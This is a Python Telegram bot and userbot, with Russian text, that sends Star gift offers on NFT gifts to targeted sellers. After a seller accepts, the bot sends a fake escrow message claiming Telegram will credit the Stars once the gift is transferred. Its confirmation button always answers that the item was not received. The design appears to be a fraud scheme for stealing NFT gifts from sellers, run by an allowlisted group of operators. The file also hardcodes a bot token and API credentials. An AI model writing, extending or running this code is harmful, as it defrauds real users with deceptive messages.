# bot_tdlib.py — NFT Deal | Telethon MTProto + aiogram | SendStarGiftOffer
import asyncio
import logging
import random
import re
import sqlite3
import string
import os
from datetime import datetime, timedelta

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.tl.functions.payments import SendStarGiftOfferRequest
from telethon.tl.types import InputPeerUser

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart, CommandObject
from aiogram.types import (
    CallbackQuery, InlineKeyboardButton, Message
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

# ── НАСТРОЙКИ ────────────────────────────────────────────────
API_ID    = 6
API_HASH  = "eb06d4abfb49dc3eeb1aeb98ae0f581e"
BOT_TOKEN = "8943957778:AAHFavcoOf4_jHKcjpzK6EaAhOeGnrtAqvU"
ADMIN_ID  = 8926402887
OFFER_DURATION = 6 * 3600  # 6 часов в секундах

# ── Сессия ───────────────────────────────────────────────────
SESSION_FILE = "session_string.txt"
try:
    with open(SESSION_FILE) as f:
        _session_str = f.read().strip()
except FileNotFoundError:
    _session_str = os.environ.get("TG_SESSION", "")

client = TelegramClient(StringSession(_session_str), API_ID, API_HASH)
bot    = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp     = Dispatcher()

# состояния авторизации
auth_state = {}
auth_data  = {}

# ── БД ───────────────────────────────────────────────────────
db = sqlite3.connect("deals.db", check_same_thread=False)
db.row_factory = sqlite3.Row
db.executescript("""
CREATE TABLE IF NOT EXISTS deals (
    order_id        TEXT PRIMARY KEY,
    buyer_username  TEXT,
    seller_id       INTEGER,
    nft_url         TEXT,
    nft_slug        TEXT,
    nft_num         TEXT,
    amount          INTEGER,
    status          TEXT DEFAULT 'offer',
    created_at      TEXT
);
CREATE TABLE IF NOT EXISTS allowed_users (
    user_id         INTEGER PRIMARY KEY
);
CREATE TABLE IF NOT EXISTS allowed_usernames (
    username        TEXT PRIMARY KEY
);
""")
db.commit()


def gen_order_id() -> str:
    return "TG-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

def parse_nft(url: str):
    m = re.match(r"https?://t\.me/nft/([A-Za-z]+)-(\d+)", url)
    return (m.group(1), m.group(2)) if m else (None, None)

def get_deal(order_id: str) -> dict | None:
    row = db.execute("SELECT * FROM deals WHERE order_id=?", (order_id,)).fetchone()
    return dict(row) if row else None

def upd(order_id: str, **kw):
    for k, v in kw.items():
        db.execute(f"UPDATE deals SET {k}=? WHERE order_id=?", (v, order_id))
    db.commit()

def is_allowed(user_id: int, username: str = None) -> bool:
    if user_id == ADMIN_ID:
        return True
    row = db.execute("SELECT 1 FROM allowed_users WHERE user_id=?", (user_id,)).fetchone()
    if row:
        return True
    if username:
        uname = username.lstrip("@").lower()
        row2 = db.execute("SELECT 1 FROM allowed_usernames WHERE username=?", (uname,)).fetchone()
        if row2:
            return True
    return False

def add_user(value: str):
    value = value.strip()
    if value.lstrip("@").isdigit():
        db.execute("INSERT OR IGNORE INTO allowed_users (user_id) VALUES (?)", (int(value.lstrip("@")),))
    else:
        db.execute("INSERT OR IGNORE INTO allowed_usernames (username) VALUES (?)", (value.lstrip("@").lower(),))
    db.commit()

def remove_user(value: str):
    value = value.strip()
    if value.lstrip("@").isdigit():
        db.execute("DELETE FROM allowed_users WHERE user_id=?", (int(value.lstrip("@")),))
    else:
        db.execute("DELETE FROM allowed_usernames WHERE username=?", (value.lstrip("@").lower(),))
    db.commit()


def admin_kb(order_id: str):
    kb = InlineKeyboardBuilder()
    kb.row(
        InlineKeyboardButton(text="Подтвердить", callback_data=f"adm_ok:{order_id}"),
        InlineKeyboardButton(text="Не передан",  callback_data=f"adm_no:{order_id}")
    )
    return kb.as_markup()

def deal_buttons(d: dict):
    return [
        [Button.inline("Передать NFT ↗",       f"transfer:{d['order_id']}")],
        [Button.inline("Подтвердить передачу", f"confirm:{d['order_id']}")],
    ]

def deal_text(d: dict) -> str:
    return (
        f"Ордер **#{d['order_id']}**\n\n"
        f"Покупатель зарезервировал **{d['amount']:,} ⭐️ Звёзд** через эскроу-систему "
        f"Telegram. Средства хранятся на специальном эскроу-счёте и будут автоматически "
        f"зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
        f"**Инструкция для завершения сделки:**\n"
        f"1. Передайте подарок пользователю: @{d['buyer_username']}\n"
        f"2. Нажмите «Передать NFT» и выберите [{d['nft_slug']} #{d['nft_num']}]({d['nft_url']})\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"**{d['amount']:,} ⭐️ Звёзд** на ваш баланс. Резерв действует 24 часа."
    )


# ── Бот: /start ──────────────────────────────────────────────
@dp.message(CommandStart())
async def cmd_start(msg: Message, command: CommandObject):
    uid = msg.from_user.id
    if uid == ADMIN_ID:
        await msg.answer("👋 Админ")
        return
    await msg.answer(
        "👋 Добро пожаловать!\n\n"
        "Данный бот создан для оформления офферов в Telegram. "
        "С его помощью вы можете безопасно совершать сделки по передаче NFT-подарков."
    )

@dp.message(F.text.startswith("/add "))
async def cmd_add(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return
    val = msg.text.split()[1]
    add_user(val)
    await msg.answer(f"✅ Доступ выдан: {val}")

@dp.message(F.text.startswith("/remove "))
async def cmd_remove(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return
    val = msg.text.split()[1]
    remove_user(val)
    await msg.answer(f"✅ Доступ забран: {val}")

@dp.message(F.text == "/users")
async def cmd_users(msg: Message):
    if msg.from_user.id != ADMIN_ID:
        return
    ids   = db.execute("SELECT user_id FROM allowed_users").fetchall()
    names = db.execute("SELECT username FROM allowed_usernames").fetchall()
    if not ids and not names:
        await msg.answer("Список пуст.")
        return
    lines = [str(r['user_id']) for r in ids] + ["@" + r['username'] for r in names]
    await msg.answer("С доступом:\n" + "\n".join(lines))


# ── Бот: принимаем ссылку + сумму ───────────────────────────
@dp.message(F.text.regexp(r"^https?://t\.me/nft/\S+\s+\d+"))
async def cmd_buy(msg: Message):
    uid = msg.from_user.id
    if not is_allowed(uid, msg.from_user.username):
        await msg.answer("Бот недоступен.")
        return

    parts   = msg.text.strip().split()
    nft_url = parts[0]
    amount  = int(parts[1])

    slug, num = parse_nft(nft_url)
    if not slug:
        await msg.answer("❌ Неверная ссылка.")
        return

    # slug для MTProto: DurovsCap-2776
    nft_slug_full = f"{slug}-{num}"

    await msg.answer(
        f"⏳ Отправляю нативный оффер...\n\n"
        f"NFT: <b>{slug} #{num}</b>\n"
        f"Сумма: <b>{amount:,} ⭐️</b>\n\n"
        f"Укажи username или ID продавца (напр. @username):"
    )

    # сохраняем временно в auth_data для следующего шага
    auth_data[uid] = {
        "nft_url": nft_url,
        "slug": slug,
        "num": num,
        "nft_slug_full": nft_slug_full,
        "amount": amount,
        "step": "waiting_seller"
    }


# ── Бот: получаем username продавца ─────────────────────────
@dp.message(F.text.startswith("@") | F.text.regexp(r"^\d+$"))
async def cmd_seller(msg: Message):
    uid = msg.from_user.id
    if not is_allowed(uid, msg.from_user.username):
        return

    data = auth_data.get(uid)
    if not data or data.get("step") != "waiting_seller":
        return

    seller_input = msg.text.strip()
    await msg.answer("⏳ Отправляю оффер продавцу...")

    try:
        # получаем entity продавца через telethon
        seller_entity = await client.get_entity(seller_input)
        seller_id = seller_entity.id

        # отправляем нативный Stars Gift Offer через MTProto
        result = await client(SendStarGiftOfferRequest(
            peer=seller_entity,
            slug=data['nft_slug_full'],
            price=data['amount'],
            duration=OFFER_DURATION,
            random_id=random.randint(0, 2**31)
        ))

        order_id       = gen_order_id()
        buyer_username = msg.from_user.username or str(uid)

        db.execute("""
            INSERT INTO deals
              (order_id, buyer_username, seller_id, nft_url, nft_slug, nft_num, amount, status, created_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, 'offer', ?)
        """, (order_id, buyer_username, seller_id, data['nft_url'],
              data['slug'], data['num'], data['amount'], datetime.now().isoformat()))
        db.commit()

        auth_data.pop(uid, None)

        await msg.answer(
            f"✅ Нативный оффер отправлен!\n\n"
            f"Ордер: <b>{order_id}</b>\n"
            f"NFT: <b>{data['slug']} #{data['num']}</b>\n"
            f"Продавец: {seller_input}\n"
            f"Сумма: <b>{data['amount']:,} ⭐️</b>"
        )

        await bot.send_message(
            ADMIN_ID,
            f"📤 <b>Оффер отправлен</b>\n\n"
            f"Ордер: <b>{order_id}</b>\n"
            f"NFT: <b>{data['slug']} #{data['num']}</b>\n"
            f"Продавец: {seller_input}\n"
            f"Сумма: <b>{data['amount']:,} ⭐️</b>"
        )

    except Exception as e:
        from aiogram.utils.markdown import html_decoration as hd
        auth_data.pop(uid, None)
        await msg.answer(f"❌ Ошибка: {hd.quote(str(e))}")


# ── Бот: авторизация ─────────────────────────────────────────
@dp.message(F.text)
async def auth_and_catch(msg: Message):
    uid = msg.from_user.id
    if uid != ADMIN_ID:
        if not is_allowed(uid, msg.from_user.username):
            await msg.answer("Бот недоступен.")
        return

    text = msg.text.strip()

    if auth_state.get(uid) == "phone":
        phone = text
        auth_data[uid] = {"phone": phone}
        try:
            result = await client.send_code_request(phone)
            auth_data[uid]["phone_code_hash"] = result.phone_code_hash
            auth_state[uid] = "code"
            await bot.send_message(uid, "📨 Код отправлен. Введи код:")
        except Exception as e:
            from aiogram.utils.markdown import html_decoration as hd
            await bot.send_message(uid, f"❌ Ошибка: {hd.quote(str(e))}")
            auth_state.pop(uid, None)

    elif auth_state.get(uid) == "code":
        code = text.replace(" ", "")
        try:
            await client.sign_in(auth_data[uid]["phone"], code,
                                  phone_code_hash=auth_data[uid]["phone_code_hash"])
            await finish_auth(uid)
        except Exception as e:
            err = str(e)
            if "SessionPasswordNeeded" in err or "2FA" in err or "password" in err.lower():
                auth_state[uid] = "2fa"
                await bot.send_message(uid, "🔒 Введи облачный пароль (2FA):")
            else:
                from aiogram.utils.markdown import html_decoration as hd
                await bot.send_message(uid, f"❌ Ошибка: {hd.quote(str(e))}")
                auth_state.pop(uid, None)

    elif auth_state.get(uid) == "2fa":
        try:
            await client.sign_in(password=text)
            await finish_auth(uid)
        except Exception as e:
            from aiogram.utils.markdown import html_decoration as hd
            await bot.send_message(uid, f"❌ Неверный пароль: {hd.quote(str(e))}")


async def finish_auth(uid: int):
    auth_state.pop(uid, None)
    auth_data.pop(uid, None)
    me = await client.get_me()
    session_str = client.session.save()
    with open(SESSION_FILE, "w") as f:
        f.write(session_str)
    await bot.send_message(
        uid,
        f"✅ Авторизован как @{me.username} ({me.id})\n\n"
        f"<b>Строка сессии (сохрани):</b>\n<code>{session_str}</code>"
    )
    asyncio.create_task(run_userbot())


# ── Userbot: callback от кнопок на нативном оффере ───────────
@client.on(events.CallbackQuery())
async def on_tl_callback(event):
    data = event.data.decode() if event.data else ""

    if data.startswith("transfer:"):
        order_id = data.split(":")[1]
        d = get_deal(order_id)
        if not d:
            return
        await event.answer(
            f"Откройте профиль @{d['buyer_username']} и передайте подарок.",
            alert=True
        )

    elif data.startswith("confirm:"):
        order_id = data.split(":")[1]
        d = get_deal(order_id)
        if not d or d['status'] != 'active':
            await event.answer("Ордер недоступен.", alert=True)
            return
        await event.answer(
            "Внимание!\n\nТовар не получен, попробуйте передать ещё раз.",
            alert=True
        )
        try:
            await bot.send_message(
                ADMIN_ID,
                f"🔔 <b>Попытка подтверждения</b>\n\n"
                f"Ордер: <b>{d['order_id']}</b>\n"
                f"NFT: <b>{d['nft_slug']} #{d['nft_num']}</b>\n"
                f"Сумма: <b>{d['amount']:,} ⭐️</b>\n"
                f"Покупатель: @{d['buyer_username']}\n\n"
                f"Нажми если NFT передан:",
                reply_markup=admin_kb(order_id)
            )
        except Exception as e:
            logging.error(e)


# ── Userbot: продавец принял нативный оффер ──────────────────
@client.on(events.Raw())
async def on_raw(update):
    # Telegram шлёт updateStarGiftOfferAccepted когда продавец принял
    try:
        from telethon.tl.types import UpdateStarGiftOfferAccepted
        if isinstance(update, UpdateStarGiftOfferAccepted):
            # находим ордер по seller_id и slug
            row = db.execute(
                "SELECT * FROM deals WHERE seller_id=? AND status='offer'",
                (update.user_id,)
            ).fetchone()
            if row:
                d = dict(row)
                upd(d['order_id'], status='active')
                # шлём карточку NFT Deal продавцу через юзербот
                await client.send_message(
                    update.user_id,
                    deal_text(d),
                    buttons=deal_buttons(d),
                    parse_mode='md',
                    link_preview=True
                )
    except (ImportError, AttributeError):
        pass


# ── Aiogram: подтвердить от админа ───────────────────────────
@dp.callback_query(F.data.startswith("adm_ok:"))
async def cb_adm_ok(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return
    upd(order_id, status='completed')
    await call.answer("Подтверждено.")
    await call.message.edit_reply_markup(reply_markup=None)
    await call.message.answer(f"✅ Ордер {order_id} завершён.")
    try:
        await client.send_message(
            d['seller_id'],
            f"Передача подтверждена!\n\nОрдер **#{d['order_id']}**\n"
            f"**{d['amount']:,} ⭐️ Звёзд** зачислены на ваш баланс.",
            parse_mode='md'
        )
    except Exception as e:
        logging.error(e)


@dp.callback_query(F.data.startswith("adm_no:"))
async def cb_adm_no(call: CallbackQuery):
    if call.from_user.id != ADMIN_ID:
        return
    order_id = call.data.split(":")[1]
    d = get_deal(order_id)
    if not d:
        return
    upd(order_id, status='active')
    await call.answer("Отклонено.")
    await call.message.edit_reply_markup(reply_markup=None)


# ── Запуск ───────────────────────────────────────────────────
async def run_userbot():
    try:
        await client.run_until_disconnected()
    except Exception as e:
        logging.error(f"userbot: {e}")


async def main():
    logging.basicConfig(level=logging.INFO)

    from aiogram.types import BotCommand
    await bot.set_my_commands([BotCommand(command="start", description="Запустить")])
    await bot.delete_webhook(drop_pending_updates=True)

    await client.connect()

    if _session_str and await client.is_user_authorized():
        me = await client.get_me()
        logging.info(f"Юзербот: @{me.username}")
        session_str = client.session.save()
        with open(SESSION_FILE, "w") as f:
            f.write(session_str)
        try:
            await bot.send_message(ADMIN_ID, f"✅ Запущен как @{me.username}")
        except Exception:
            pass
        await asyncio.gather(
            dp.start_polling(bot, allowed_updates=["message", "callback_query"]),
            run_userbot()
        )
    else:
        await bot.send_message(ADMIN_ID, "📱 Введи номер телефона:\n(формат: +79001234567)")
        auth_state[ADMIN_ID] = "phone"
        await dp.start_polling(bot, allowed_updates=["message", "callback_query"])


if __name__ == "__main__":
    asyncio.run(main())
